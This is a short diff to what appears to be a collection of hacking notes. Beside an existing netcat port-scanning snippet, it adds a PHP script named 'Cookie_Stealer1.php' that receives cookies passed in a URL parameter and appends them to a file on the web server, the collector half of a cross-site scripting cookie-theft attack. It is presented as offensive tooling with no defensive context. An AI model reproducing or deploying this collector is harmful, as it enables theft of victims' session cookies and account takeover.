@@ -21,3 +21,10 @@ echo "Enter ports space-delimited (e.g. 21-23 80): "
 read ports
 nc -nvzw1 $net $ports 2>&1 | grep -E 'succ|open'
 ```
+## Cookie_Stealer1.php
+ <?php
+  2 $cookie = $_GET["username"];
+  3 $steal = fopen("/var/www/html/cookiefile.txt", "a+");
+  4 fwrite($steal, $cookie ."\n");
+  5 fclose($steal);
+  6 ?>
